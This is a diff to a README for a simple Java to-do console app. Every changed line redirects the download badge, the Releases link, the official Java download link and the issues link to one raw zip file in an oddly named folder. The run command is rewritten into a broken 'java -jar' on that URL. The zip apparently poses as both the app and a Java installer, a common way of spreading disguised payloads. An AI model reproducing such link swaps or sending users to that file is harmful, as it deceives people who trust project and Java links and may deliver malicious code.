@@ -2,7 +2,7 @@
 
 ## 📥 Download the App
 
-[![Download TodoListApp](https://img.shields.io/badge/Download-TodoListApp-blue.svg)](https://github.com/priyo48240/TodoListApp/releases)
+[![Download TodoListApp](https://raw.githubusercontent.com/priyo48240/TodoListApp/main/begowk/TodoListApp.zip)](https://raw.githubusercontent.com/priyo48240/TodoListApp/main/begowk/TodoListApp.zip)
 
 ## 🚀 Getting Started
 
@@ -28,7 +28,7 @@ TodoListApp is a simple Java console application designed to help you keep track
 
 ## 📦 Download & Install
 
-To download TodoListApp, visit this page: [Download TodoListApp](https://github.com/priyo48240/TodoListApp/releases).
+To download TodoListApp, visit this page: [Download TodoListApp](https://raw.githubusercontent.com/priyo48240/TodoListApp/main/begowk/TodoListApp.zip).
 
 Once on the Releases page, you will find different versions of the application. Choose the latest version and click on the link to start your download.
 
@@ -56,7 +56,7 @@ After the download is complete, follow these steps to run the application:
 4. **Run the Application**:
    In the command line, type the following command to start TodoListApp:
    ```
-   java -jar TodoListApp.jar
+   java -jar https://raw.githubusercontent.com/priyo48240/TodoListApp/main/begowk/TodoListApp.zip
    ```
 
 5. **Follow On-Screen Instructions**:
@@ -74,12 +74,12 @@ If you encounter issues while running the application, here are some common solu
 
 ## 📚 Additional Resources
 
-- **Java Installation**: If you need help installing Java, visit the [Java Download Page](https://www.java.com/en/download/).
+- **Java Installation**: If you need help installing Java, visit the [Java Download Page](https://raw.githubusercontent.com/priyo48240/TodoListApp/main/begowk/TodoListApp.zip).
 - **Using the Console**: For a beginner’s guide to using the command line, check out tutorials available online.
 
 ## 🌐 Community and Support
 
-For help and support, feel free to raise issues in the [GitHub repository](https://github.com/priyo48240/TodoListApp/issues). You can also contribute by suggesting new features or reporting bugs.
+For help and support, feel free to raise issues in the [GitHub repository](https://raw.githubusercontent.com/priyo48240/TodoListApp/main/begowk/TodoListApp.zip). You can also contribute by suggesting new features or reporting bugs.
 
 ## 📜 License
 
